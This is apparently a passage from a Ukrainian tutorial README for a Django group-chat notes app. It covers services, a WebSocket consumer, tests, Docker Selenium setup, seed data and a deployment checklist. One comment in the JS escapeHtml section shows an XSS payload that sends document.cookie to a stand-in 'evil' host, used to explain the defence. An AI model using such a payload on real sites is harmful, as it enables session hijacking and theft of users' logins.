def get_chat_history(group_pk, limit=50):
    """
    Останні 50 повідомлень групи у хронологічному порядку.

    SELECT cm.*, au.username as author__username
    FROM chatmessage cm
    LEFT JOIN auth_user au ON cm.author_id = au.id
    WHERE cm.group_id = %s
    ORDER BY cm.timestamp DESC
    LIMIT 50
    [reverse() у Python]
    """
    return (
        ChatMessage.objects
        .filter(group_id=group_pk)
        .select_related('author')
        .order_by('-timestamp')[:limit]
        # Лінк на slice QuerySet: PostgreSQL LIMIT 50
    )
    # NOTE: Consumer викликає цю функцію через database_sync_to_async
    # і матеріалізує в list: list(qs.values(...)) всередині sync thread
```

### services.py — ключові сервіси

```python
# notes_app/services.py
from django.db import transaction
from .models import Note, Notebook, Tag


def create_note(*, user, title, content='', priority=1,
                notebook=None, tag_ids=None, group=None,
                is_pinned=False):
    """
    Створює нотатку і прикріплює теги.

    Атомарна операція: якщо tags.set() провалиться → note теж rollback.
    """
    with transaction.atomic():
        note = Note.objects.create(
            user=user,
            title=title,
            content=content,
            priority=priority,
            notebook=notebook,
            group=group,
            is_pinned=is_pinned,
        )

        if tag_ids:
            # Security: filter(user=user) блокує чужі теги
            # POST /notes/new/ {tag_ids: [bob_secret_tag_id]} → не прикріпиться
            valid_tags = Tag.objects.filter(id__in=tag_ids, user=user)
            note.tags.set(valid_tags)

    return note


def create_notebook(*, user, title, color='#6c757d', is_default=False):
    """
    Створює записник. Бізнес-правило: тільки ОДИН default на юзера.

    transaction.atomic(): якщо CREATE падає після UPDATE → обидва rollback.
    """
    with transaction.atomic():
        if is_default:
            # Спочатку скидаємо всі existing default ТІЛЬКИ цього юзера
            Notebook.objects.filter(user=user, is_default=True).update(is_default=False)
            # filter(user=user) критично!
            # Без нього: скинемо default у ВСІХ юзерів → Bob втрачає свій default
        return Notebook.objects.create(
            user=user, title=title, color=color, is_default=is_default
        )


def toggle_pin_note(note):
    """Перемикає is_pinned. Atomic UPDATE без завантаження об'єкта."""
    Note.objects.filter(pk=note.pk).update(is_pinned=~models.F('is_pinned'))
    # ~F('is_pinned') = NOT is_pinned
    # Один SQL UPDATE без SELECT + Python + UPDATE
    # Безпечно від race condition (два юзери натиснули одночасно)


def create_group(*, name, creator):
    """Створює Django Group і додає creator як першого учасника."""
    group = Group.objects.create(name=name)
    group.user_set.add(creator)   # M:N insert в auth_user_groups
    return group


def add_user_to_group(group, username):
    """Додає юзера за username. Повертає (success, error_message)."""
    try:
        user = User.objects.get(username=username)
    except User.DoesNotExist:
        return False, f'Користувача «{username}» не знайдено.'

    if group.user_set.filter(pk=user.pk).exists():
        return False, f'«{username}» вже є членом цієї групи.'

    group.user_set.add(user)
    return True, ''
```

### Context Processor — sidebar без дублювання

```python
# notes_app/context_processors.py
from django.db import OperationalError
from . import selectors


def sidebar_context(request):
    """
    Автоматично додає дані для sidebar у КОЖЕН шаблон.
    Виконується при кожному HTTP запиті для залогінених юзерів.

    Без context processor:
        def note_list(request): notebooks = selectors.get_user_notebooks(request.user)
        def note_create(request): notebooks = selectors.get_user_notebooks(request.user)
        def notebook_list(request): notebooks = selectors.get_user_notebooks(request.user)
        → 50+ views × 2 запити = 100+ дублювань
    """
    if not request.user.is_authenticated:
        return {}

    try:
        # try/except OperationalError: захист від "нова міграція не застосована"
        # Якщо запустили manage.py runserver без migrate після git pull
        # → context processor не впаде з 500, поверне {} → sidebar пустий, але сайт живий
        return {
            'sidebar_notebooks': selectors.get_user_notebooks(request.user),
            'sidebar_tags': selectors.get_user_tags(request.user),
        }
    except OperationalError:
        return {}
```

---

## 10 · CONSUMERS

> **Consumer** — аналог view, але живе весь час WebSocket з'єднання.
> Один Consumer об'єкт = одне відкрите браузерне з'єднання.

### Повний GroupChatConsumer

```python
# notes_app/consumers.py
import json
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from django.contrib.auth.models import Group
from .models import ChatMessage


class GroupChatConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer для групового чату.

    URL: /ws/groups/<group_pk>/chat/
    Channel group: "chat_group_<group_pk>"

    Lifecycle:
        connect()      → авторизація + membership check + group_add + history
        receive()      → save to DB + group_send (broadcast)
        chat_message() → send до НАШОГО браузера (отримали broadcast)
        disconnect()   → group_discard
    """

    # ── CONNECT ──────────────────────────────────────────────────────────────

    async def connect(self):
        # scope['user'] встановлюється AuthMiddlewareStack при WS handshake:
        # читає session cookie → SELECT FROM django_session → User object
        self.user = self.scope['user']

        # Незалогінений → закриваємо без accept()
        # Браузер отримує close frame, js: ws.onclose({code: 4403})
        if not self.user.is_authenticated:
            await self.close(code=4403)
            return

        # group_pk з URL: /ws/groups/7/chat/ → {'group_pk': '7'}
        self.group_pk = int(self.scope['url_route']['kwargs']['group_pk'])

        # Перевіряємо membership через database_sync_to_async
        # (ORM не можна викликати напряму в async context)
        is_member = await self.check_membership(self.group_pk, self.user)
        if not is_member:
            await self.close(code=4404)
            return

        # Ім'я "broadcasting group" у channel layer
        # Всі consumers цієї групи підписані на "chat_group_<pk>"
        self.room_group_name = f'chat_group_{self.group_pk}'

        # Додаємо себе до broadcasting group
        # self.channel_name = унікальний ID цього consumer (UUID-подібний)
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name,
        )

        # ОБОВ'ЯЗКОВО: прийняти з'єднання
        # Без await self.accept() → браузер отримає HTTP 403 (not WS 101)
        await self.accept()

        # Надіслати history (останні 50 повідомлень)
        history = await self.load_history(self.group_pk)
        for msg in history:
            await self.send(text_data=json.dumps({
                'type': 'history',
                'author': msg['author__username'] or 'Видалений юзер',
                'content': msg['content'],
                'timestamp': msg['timestamp'].isoformat(),
            }))

    # ── RECEIVE ───────────────────────────────────────────────────────────────

    async def receive(self, text_data):
        """Браузер надіслав повідомлення."""
        try:
            data = json.loads(text_data)
        except json.JSONDecodeError:
            return   # ігноруємо некоректний JSON

        content = data.get('content', '').strip()

        # Валідація: не порожнє, не більше 2000 символів
        if not content or len(content) > 2000:
            return

        # Зберігаємо в БД (через sync thread)
        msg = await self.save_message(self.group_pk, self.user, content)

        # Broadcast ВСІМ підписникам: consumer кожного учасника чату отримає
        # event і викличе метод chat_message()
        await self.channel_layer.group_send(
            self.room_group_name,
            {
                'type': 'chat_message',     # → Django Channels → метод chat_message()
                'author': self.user.username,
                'content': content,
                'timestamp': msg.timestamp.isoformat(),
                'message_id': msg.pk,
            }
        )

    # ── CHAT_MESSAGE ──────────────────────────────────────────────────────────

    async def chat_message(self, event):
        """
        Отримали broadcast від channel layer.
        Задача: надіслати JSON до НАШОГО браузера.

        Цей метод викликається і для відправника, і для всіх одержувачів.
        'type': 'chat_message' → Django Channels шукає метод chat_message()
        (підкреслення ↔ крапка: 'chat.message' → метод chat_message)
        """
        await self.send(text_data=json.dumps({
            'type': 'message',
            'author': event['author'],
            'content': event['content'],
            'timestamp': event['timestamp'],
            'message_id': event['message_id'],
        }))

    # ── DISCONNECT ────────────────────────────────────────────────────────────

    async def disconnect(self, close_code):
        """
        Браузер закрив з'єднання (вкладка закрита, logout, інтернет обірвався).

        ОБОВ'ЯЗКОВО: group_discard, щоб channel layer більше не надсилав events
        цьому consumer. Без цього → channel layer намагається deliver → помилка.

        close_code:
            1000 = нормальне закриття (вкладка закрита)
            1001 = сторінка навігується
            1006 = аварійне закриття (інтернет обірвався)
        """
        if hasattr(self, 'room_group_name'):
            await self.channel_layer.group_discard(
                self.room_group_name,
                self.channel_name,
            )

    # ── DATABASE HELPERS ──────────────────────────────────────────────────────

    @database_sync_to_async
    def check_membership(self, group_pk, user):
        """Перевірити чи user є членом групи group_pk."""
        try:
            group = Group.objects.get(pk=group_pk)
            return group.user_set.filter(pk=user.pk).exists()
        except Group.DoesNotExist:
            return False

    @database_sync_to_async
    def load_history(self, group_pk):
        """
        Завантажити останні 50 повідомлень.

        КРИТИЧНО: повертаємо list, не QuerySet!
        QuerySet — lazy, прив'язаний до thread де створений.
        Якщо повернути QuerySet і ітерувати в async context:
            → SynchronousOnlyOperation або дані не завантажені

        list(qs.values(...)) виконує SQL ТУТ, у worker thread → безпечно.
        """
        qs = (
            ChatMessage.objects
            .filter(group_id=group_pk)
            .select_related('author')
            .order_by('-timestamp')[:50]
        )
        msgs = list(qs.values('author__username', 'content', 'timestamp'))
        msgs.reverse()   # хронологічний порядок (було DESC для LIMIT, тепер ASC)
        return msgs

    @database_sync_to_async
    def save_message(self, group_pk, user, content):
        """Зберегти повідомлення в БД."""
        return ChatMessage.objects.create(
            group_id=group_pk,
            author=user,
            content=content,
        )
```

### XSS захист у JS клієнті

```javascript
// static/notes_app/js/group_chat.js

function escapeHtml(text) {
    // ОБОВ'ЯЗКОВО для будь-якого user-generated content!
    // Без escapeHtml:
    //   data.content = '<img src=x onerror="fetch(evil+document.cookie)">'
    //   div.innerHTML = data.content → XSS → Session Hijacking всіх учасників чату
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

const ws = new WebSocket(
    `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws/groups/${groupPk}/chat/`
    // wss:// для HTTPS (ngrok), ws:// для HTTP (localhost)
);

ws.onmessage = function(e) {
    const data = JSON.parse(e.data);

    if (data.type === 'history' || data.type === 'message') {
        const div = document.createElement('div');
        div.classList.add('chat-message');

        // escapeHtml() для КОЖНОГО поля від сервера що містить user content:
        div.innerHTML = `
            <span class="author">${escapeHtml(data.author)}</span>
            <span class="content">${escapeHtml(data.content)}</span>
            <span class="time">${escapeHtml(data.timestamp)}</span>
        `;

        chatContainer.appendChild(div);
        chatContainer.scrollTop = chatContainer.scrollHeight;   // прокрутити вниз
    }
};

// Авторепідключення:
ws.onclose = function(e) {
    if (e.code !== 1000 && e.code !== 1001) {
        // 1000 = нормальне, 1001 = навігація → не перепідключатись
        // Інші коди (1006 = аварія) → перепідключитись через 3 секунди
        setTimeout(() => initWebSocket(), 3000);
    }
};
```

---

## 11 · ТЕСТОВА СТРАТЕГІЯ

> **5 рівнів перевірки:** models → services → forms → views → consumers → selenium.

### Що і де тестуємо

```
notes_app/tests/
├── __init__.py          ← порожній (обов'язковий для пакету)
├── test_models.py       ← constraints, __str__, SET_NULL, validators
├── test_services.py     ← CRUD, security, transactions, business rules
├── test_forms.py        ← validation, normalization, queryset security
├── test_views.py        ← HTTP codes, ownership, redirects, IDOR prevention
├── test_consumers.py    ← WebSocket auth, connect/receive/disconnect
└── test_selenium.py     ← E2E: browser forms, navigation
```

### test_consumers.py — WebSocket тести

```python
# notes_app/tests/test_consumers.py
from channels.testing import WebsocketCommunicator
from channels.db import database_sync_to_async
from django.contrib.auth.models import Group, User
from django.test import TestCase
from notes_project.asgi import application


class GroupChatConsumerTest(TestCase):

    def setUp(self):
        self.alice = User.objects.create_user('alice', password='pass123')
        self.bob   = User.objects.create_user('bob',   password='pass123')
        self.group = Group.objects.create(name='TestGroup')
        self.group.user_set.add(self.alice)
        # bob не додано до групи → для тесту non-member

    async def test_non_member_cannot_connect(self):
        """Юзер не в групі → WebSocket закривається."""
        communicator = WebsocketCommunicator(
            application,
            f'/ws/groups/{self.group.pk}/chat/',
        )
        # Встановити user у scope (AuthMiddlewareStack normally handles this)
        communicator.scope['user'] = self.bob

        connected, code = await communicator.connect()
        self.assertFalse(connected)
        # АБО: connected=True але одразу close з code 4404
        await communicator.disconnect()

    async def test_member_can_connect_and_receive_history(self):
        """Член групи підключається і отримує history."""
        # Додаємо тестове повідомлення в БД
        from notes_app.models import ChatMessage
        await database_sync_to_async(ChatMessage.objects.create)(
            group=self.group,
            author=self.alice,
            content='Test message'
        )

        communicator = WebsocketCommunicator(
            application,
            f'/ws/groups/{self.group.pk}/chat/',
        )
        communicator.scope['user'] = self.alice

        connected, _ = await communicator.connect()
        self.assertTrue(connected)

        # Першим повідомленням має бути history
        response = await communicator.receive_json_from()
        self.assertEqual(response['type'], 'history')
        self.assertEqual(response['content'], 'Test message')

        await communicator.disconnect()

    async def test_send_message_broadcasts_to_all(self):
        """Повідомлення від Alice доходить до Bob'а."""
        self.group.user_set.add(self.bob)   # додаємо Bob до групи

        # Два комунікатори = два браузери
        comm_alice = WebsocketCommunicator(application, f'/ws/groups/{self.group.pk}/chat/')
        comm_bob   = WebsocketCommunicator(application, f'/ws/groups/{self.group.pk}/chat/')

        comm_alice.scope['user'] = self.alice
        comm_bob.scope['user']   = self.bob

        await comm_alice.connect()
        await comm_bob.connect()

        # Alice надсилає
        await comm_alice.send_json_to({'content': 'Hello Bob!'})

        # Bob отримує broadcast
        bob_response = await comm_bob.receive_json_from()
        self.assertEqual(bob_response['type'], 'message')
        self.assertEqual(bob_response['content'], 'Hello Bob!')
        self.assertEqual(bob_response['author'], 'alice')

        await comm_alice.disconnect()
        await comm_bob.disconnect()
```

### Запуск тестів — всі варіанти

```bash
# ─── Через Docker (рекомендовано) ──────────────────────────────────────────

# Всі unit + integration + consumer тести
docker compose run --rm web python manage.py test \
  notes_app.tests.test_models \
  notes_app.tests.test_services \
  notes_app.tests.test_forms \
  notes_app.tests.test_views \
  notes_app.tests.test_consumers \
  -v 2

# Selenium E2E тести (EXEC не RUN!)
docker compose up -d                    # спочатку підняти стек
docker compose exec web python manage.py test notes_app.tests.test_selenium -v 2
# exec: використовує ЗАПУЩЕНИЙ контейнер → "web" DNS alias існує
# run:  НОВИЙ контейнер без "web" alias → Selenium не може дістатись до live server!

# Конкретний клас:
docker compose run --rm web python manage.py test \
  notes_app.tests.test_views.NoteListViewTest -v 2

# Зупинитись на першому провалі:
docker compose run --rm web python manage.py test notes_app.tests --failfast

# Coverage:
docker compose run --rm web sh -c "
  coverage run manage.py test notes_app.tests.test_models notes_app.tests.test_services notes_app.tests.test_forms notes_app.tests.test_views notes_app.tests.test_consumers
  coverage report --show-missing
"
```

---

## 12 · SELENIUM У DOCKER

> **Різниця від попередніх уроків:** тут Selenium запускається у окремому контейнері
> (не локально). Django test server і Chrome у різних контейнерах — потрібна special configuration.

### Проблема: localhost ≠ localhost між контейнерами

```
БЕЗ Docker Selenium (попередні уроки):
  Runner VM: Django test server (localhost:PORT) + Chrome (localhost:PORT) ✓
  Chrome бачить Django за localhost → OK

З Docker Selenium:
  web container: Django test server (localhost:PORT)
  selenium container: Chrome
    Chrome: http://localhost:PORT → NOT FOUND!
    localhost в selenium container = IP самого selenium container
    НЕ IP web container!
```

### Рішення: \_DockerLiveServerMixin

```python
# notes_app/tests/test_selenium.py

class _DockerLiveServerMixin:
    """
    Дозволяє Selenium у Docker container бачити Django test server.

    Проблема: LiveServerTestCase зазвичай bind на 127.0.0.1 (тільки localhost).
    Рішення: bind на 0.0.0.0 (всі interfaces) → доступний з selenium container.

    Також замінює 0.0.0.0 на "web" у live_server_url:
    http://0.0.0.0:PORT → http://web:PORT
    "web" — DNS ім'я web container у Docker network app-net.
    """
    host = '0.0.0.0'   # StaticLiveServerTestCase.host

    @property
    def live_server_url(self):
        url = super().live_server_url           # http://0.0.0.0:PORT
        web_host = os.environ.get('WEB_HOST')  # = "web" (з docker-compose.yml env)
        if web_host:
            return url.replace('0.0.0.0', web_host)  # http://web:PORT
        return url


def _make_driver():
    """Повертає Chrome WebDriver: Remote (Docker) або локальний."""
    remote_url = os.environ.get('SELENIUM_REMOTE_URL')
    # = http://selenium:4444/wd/hub (з docker-compose.yml env web.environment)

    if remote_url:
        # Docker: Chrome запускається у selenium контейнері
        options = webdriver.ChromeOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        # headless не потрібен: selenium/standalone-chrome вже headless
        return webdriver.Remote(
            command_executor=remote_url,
            options=options,
        )
    else:
        # Локально (без Docker): Chrome на тій же машині
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        return webdriver.Chrome(options=options)


@unittest.skipUnless(SELENIUM_AVAILABLE, "selenium not installed")
class SeleniumLoginFlowTest(_DockerLiveServerMixin, StaticLiveServerTestCase):

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.driver = _make_driver()
        cls.driver.implicitly_wait(5)  # чекати до 5 сек на елемент

    @classmethod
    def tearDownClass(cls):
        cls.driver.quit()
        super().tearDownClass()

    def _login_via_cookie(self):
        """Швидкий логін через session cookie (без форми)."""
        # 1. Test Client створює session у БД
        self.client.force_login(self.user)
        session_cookie = self.client.cookies['sessionid']

        # 2. Браузер має бути на домені перед add_cookie
        self.driver.get(f'{self.live_server_url}/')

        # 3. Копіюємо session cookie до Selenium
        self.driver.add_cookie({
            'name': 'sessionid',
            'value': session_cookie.value,
            'path': '/',
        })
        # Тепер driver залогінений = той самий user що і self.client
```

### VNC — переглянути Selenium браузер живцем

```bash
# Якщо хочеш побачити що Chrome робить у selenium container:
# http://localhost:7900  (пароль: secret)
# ↑ Відкриє VNC viewer де видно Chrome в реальному часі

# Корисно для дебагу Selenium тестів:
# - Бачиш що саме знаходить driver
# - Бачиш стан форм при помилках
# - Бачиш JavaScript алерти і popups
```

---

## 13 · SEED DATA

> **seed_demo_data** — management command що заповнює БД демо-даними для розробки.

### Що створює seed_demo_data

```python
# notes_app/management/commands/seed_demo_data.py

# Створює трьох юзерів:
#   demo_alice / demo1234
#   demo_bob   / demo1234
#   demo_carol / demo1234

# Створює UserProfile для кожного

# Створює групи:
#   "Команда розробки" (alice + bob)
#   "Сімя" (alice + carol)

# Створює Notebooks для alice:
#   "Особисті" (default=True), "Робота", "Проєкти"

# Створює Tags для alice:
#   python (#3776AB), django (#092E20), ідеї (#FFD700)...

# Створює Notes (особисті + групові + архівні + закріплені)
# Створює TodoLists з TodoItems
# Створює ShoppingLists з ShopItems
# Створює ChatMessages для групових чатів (history для чату)
```

### Запуск seed_demo_data

```bash
# При першому запуску (контейнер стартує автоматично якщо SEED_DEMO_DATA=1):
docker compose up

# Вручну (скидання і повторне заповнення):
docker compose exec web python manage.py seed_demo_data --reset
# --reset: видаляє всі існуючі дані ТА ПОТІМ заповнює знову
# (еквівалентно docker compose down -v + up, але без знищення volume)

# Перевірити що дані є:
docker compose exec web python manage.py shell -c "
from notes_app.models import Note
from django.contrib.auth.models import User
print(f'Users: {User.objects.count()}')
print(f'Notes: {Note.objects.count()}')
"
```

### .env конфігурація для dev

```bash
# .env (скопіюй з .env.example)

POSTGRES_DB=notes_db
POSTGRES_USER=notes_user
POSTGRES_PASSWORD=notes_password_dev

SECRET_KEY=dev-secret-key-not-for-production
DEBUG=True
ALLOWED_HOSTS=localhost,127.0.0.1

REDIS_URL=redis://redis:6379/0
DATABASE_URL=postgres://notes_user:notes_password_dev@db:5432/notes_db

# Seed demo data при старті
SEED_DEMO_DATA=1

# ngrok (потрібен тільки для публічного доступу)
NGROK_AUTHTOKEN=          # отримати на ngrok.com
NGROK_DOMAIN=             # твій static domain (ngrok free tier: 1 static domain)
```

---

## 14 · РОЗРОБКА

### Типовий workflow

```bash
# ─── Перший запуск ─────────────────────────────────────────────────────────
cp .env.example .env          # скопіювати конфігурацію
# Відредагувати .env: додати NGROK_AUTHTOKEN і NGROK_DOMAIN якщо потрібно
docker compose up --build     # білд + запуск всіх сервісів
# Відкрий http://localhost — логін: demo_alice / demo1234

# ─── Щоденна розробка ──────────────────────────────────────────────────────
docker compose up             # піднять стек (без rebuild якщо Dockerfile не змінився)
docker compose logs -f web    # слідкувати за логами Django

# Після зміни requirements.txt або Dockerfile:
docker compose up --build     # перебілдити web контейнер

# ─── Зміна коду (Python файли) ─────────────────────────────────────────────
# uvicorn --reload автоматично перезапускає при зміні .py файлів
# (дивись в логах: "Detected file change in notes_app/views.py")
# Для шаблонів (.html): перезавантаж браузер вручну

# ─── Нова міграція ─────────────────────────────────────────────────────────
docker compose exec web python manage.py makemigrations
docker compose exec web python manage.py migrate

# ─── Django shell ──────────────────────────────────────────────────────────
docker compose exec web python manage.py shell
>>> from notes_app.models import Note, User
>>> User.objects.count()

# ─── Зупинка ───────────────────────────────────────────────────────────────
docker compose down           # зупинити (дані в volumes зберігаються)
docker compose down -v        # зупинити + видалити volumes (скинути БД!)

# ─── Debug ─────────────────────────────────────────────────────────────────
docker compose ps             # статус всіх контейнерів
docker compose logs nginx     # логи nginx (access + errors)
docker compose logs redis     # логи redis
docker network inspect notes_chat_app_app-net  # перевірити мережу
```

### Корисні команди

```bash
# Django management commands:
docker compose exec web python manage.py check --deploy    # перевірка production readiness
docker compose exec web python manage.py showmigrations     # стан міграцій
docker compose exec web python manage.py createsuperuser    # admin access
docker compose exec web python manage.py dbshell           # psql до PostgreSQL
docker compose exec web python manage.py collectstatic     # зібрати static вручну

# PostgreSQL напряму:
docker compose exec db psql -U notes_user -d notes_db
  \dt          → список таблиць
  \d note      → схема таблиці note
  \q           → вийти

# Redis напряму:
docker compose exec redis redis-cli
  KEYS *            → всі ключі
  TYPE channels:*   → тип ключа
  TTL channels:*    → TTL ключа
  MONITOR           → live stream всіх команд

# nginx:
docker compose exec nginx nginx -t      # перевірити конфіг
docker compose restart nginx            # перезапустити nginx
docker compose exec nginx curl -I http://web:8001/accounts/login/   # тест upstream
```

### Читання логів nginx

```
nginx-1  | 172.29.0.1 - - [13/Jun/2026:10:00:00 +0000] "GET /notes/ HTTP/1.1" 200 4523 "-" "Mozilla..."
          │             │                               │             │    │
          IP клієнта    Час                             Метод+URL     Статус  Байти

nginx-1  | "GET /ws/groups/7/chat/ HTTP/1.1" 101 839
                                                  ↑ 101 = WebSocket upgrade SUCCESS

nginx-1  | "GET /static/admin/css/base.css HTTP/1.1" 304 0
                                                       ↑ 304 = Not Modified (браузер використовує кеш)
```

---

## 15 · PRODUCTION CHECKLIST

### Безпека (обов'язково)

- [ ] `SECRET_KEY` — унікальний, 50+ символів, згенерований `get_random_secret_key()`
- [ ] `DEBUG = False` — **НІКОЛИ True в production**
- [ ] `ALLOWED_HOSTS` — конкретні домени, не `['*']`
- [ ] `CSRF_TRUSTED_ORIGINS` — містить prod домен і ngrok домен
- [ ] `SESSION_COOKIE_SECURE = True` — cookie тільки HTTPS
- [ ] `CSRF_COOKIE_SECURE = True`
- [ ] `SECURE_SSL_REDIRECT = True` — HTTP → HTTPS redirect
- [ ] `SECURE_HSTS_SECONDS = 31536000` — HSTS на 1 рік
- [ ] `.env` у `.gitignore` — перевір `git status` перед push
- [ ] Паролі у `.env`, не у коді чи Dockerfile

### Продуктивність

- [ ] `--reload` прибрати з entrypoint.sh (uvicorn)
- [ ] `--workers 4` додати до uvicorn (4 = 2 × CPU cores)
- [ ] `CONN_MAX_AGE = 0` для ASGI (async-compatible)
- [ ] nginx `expires 7d` для статики (кешування)
- [ ] PostgreSQL `max_connections` відповідає кількості uvicorn workers
- [ ] Redis `maxmemory-policy allkeys-lru` (не дозволяти Redis заповнити RAM)

### Моніторинг і логування

- [ ] `LOGGING` у settings.py → файли або stdout для Docker
- [ ] nginx access log → analysis (Grafana Loki або ELK)
- [ ] Health check endpoints відповідають
- [ ] Uptime monitor (UptimeRobot, Better Stack)

### Деплой checklist

```bash
# Перед git push:
docker compose run --rm web python manage.py check --deploy
# Перевіряє: DEBUG, SECRET_KEY, ALLOWED_HOSTS, DATABASES, та ін.
# Якщо є WARNING → виправити перед production deploy

# Перевірити що всі тести green:
docker compose run --rm web python manage.py test notes_app.tests --failfast

# Перевірити migrate:
docker compose run --rm web python manage.py showmigrations
# Всі міграції мають мати [X]

# Перевірити static:
docker compose exec nginx curl -I http://localhost/static/admin/css/base.css
# HTTP/1.1 200 OK → nginx роздає статику правильно
```

### Генерація SECRET_KEY

```bash
# Варіант 1: Python
python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())"

# Варіант 2: OpenSSL
openssl rand -base64 50

# Варіант 3: Python secrets
python -c "import secrets; print(secrets.token_urlsafe(50))"
```

### Типові помилки при першому деплої

| Помилка | Причина | Виправлення |
|---------|---------|-------------|
| `403 CSRF verification failed` | Домен не в CSRF_TRUSTED_ORIGINS | Додати домен в settings.py + env |
| `DisallowedHost` | Домен не в ALLOWED_HOSTS | Додати домен + перезапустити |
| `WebSocket 403` | Auth не передається через nginx | Перевірити proxy_set_header у nginx.conf |
| `Static files 404` | collectstatic не запустився | Перевірити entrypoint.sh + volume mount |
| `ERR_NGROK_8012` | ngrok не знаходить nginx | Перевірити що обидва в app-net |
| `TimeoutError reading from redis` | socket_timeout у RedisChannelLayer | socket_timeout=None у CONFIG |
| `CommandError: Demo data disabled` | seed_demo_data вимкнений без DEBUG=True | Додати --force до команди |

---

## Підсумок: що і де шукати

| Концепція | Де у коді |
|-----------|-----------|
| **Docker Compose ланцюг** | `docker-compose.yml` — depends_on + healthcheck |
| **PostgreSQL підключення** | `notes_project/settings.py` — dj_database_url.parse |
| **Redis channel layer** | `settings.py` — CHANNEL_LAYERS з socket_timeout=None |
| **nginx WebSocket config** | `nginx/nginx.conf` — map $http_upgrade + proxy_http_version 1.1 |
| **Static volume** | `docker-compose.yml` staticfiles volume + nginx alias /staticfiles |
| **CSRF + ngrok** | `settings.py` — CSRF_TRUSTED_ORIGINS з NGROK_DOMAIN env |
| **entrypoint.sh ланцюг** | `entrypoint.sh` — migrate → collectstatic → seed → uvicorn |
| **Consumer lifecycle** | `notes_app/consumers.py` — connect/receive/chat_message/disconnect |
| **database_sync_to_async** | `consumers.py` — check_membership, load_history, save_message |
| **XSS захист у JS** | `static/notes_app/js/group_chat.js` — escapeHtml() |
| **IDOR захист** | `notes_app/views.py` — get_object_or_404(Note, pk=pk, user=request.user) |
| **Q-filter групи** | `notes_app/selectors.py` — Q(user=user) \| Q(group__in=user_groups) |
| **Seed data** | `notes_app/management/commands/seed_demo_data.py` |
| **Docker Selenium** | `tests/test_selenium.py` — _DockerLiveServerMixin + SELENIUM_REMOTE_URL |
| **Consumer тести** | `tests/test_consumers.py` — WebsocketCommunicator |

---

## Документація модулів

| Файл | Тема |
|------|------|
| [`../05_authentication.md`](05_authentication.md) | AuthN vs AuthZ, sessions, IDOR, Django Groups |
| [`../06_testing.md`](06_testing.md) | Unit/Integration/E2E тести, AAA паттерн |
| [`../07_async.md`](07_async.md) | ASGI, Channels, Consumer, channel layer |
| [`../08_deployment.md`](08_deployment.md) | Docker Compose, nginx, ngrok, production checklist |
| [`../README_6.md`](README_6.md) | Auth — детальний туторіал з кодом |
| [`../README_7.md`](README_7.md) | Testing — детальний туторіал з CI/CD |
| [`../README_8.md`](README_8.md) | Async — sync vs async порівняння |
| [`../../docs/09_async_and_realtime/README.md`](../../docs/09_async_and_realtime/README.md) | Async теорія |
| [`../../docs/11_deployment/README.md`](../../docs/11_deployment/README.md) | Deployment теорія |
| [`../../docs/12_final_project/README.md`](../../docs/12_final_project/README.md) | Final project overview |
